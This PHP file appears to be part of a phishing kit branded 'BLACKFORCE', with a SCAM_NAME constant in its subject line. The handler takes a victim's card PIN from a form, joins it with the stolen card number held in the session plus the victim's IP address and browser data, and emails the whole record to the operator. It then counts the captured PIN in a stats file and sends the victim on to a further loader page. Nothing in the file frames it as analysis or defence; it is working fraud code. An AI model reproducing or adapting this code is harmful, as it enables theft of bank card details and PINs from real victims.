<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['spin'] = htmlspecialchars($_POST['pin']);

if(empty($_SESSION['spin'])) {
    header("Location: ../pin.php?page=error&userid={$id}&ue={$ue}");
}
else {
        
    $subject = "🔑 CODE PIN ".SCAM_NAME." ".FLAG."FROM: $ip";
    $rezdata = "🔑 CODE PIN ".SCAM_NAME." ".FLAG."
    
🔑 CODE PIN : ".$_SESSION['spin']."

💳 CARD : ".$_SESSION['sccn']."
    
⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    $maildata = $rezdata;
    
    
    sendMailo($rezdata);
    sendMail($maildata);

    $file = '../Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['pins']++;
    update_ini($data, $file);

    header("Location: ../loader.php?view=checkmail&userid={$id}&ue={$ue}");
}

}
// SMS Config END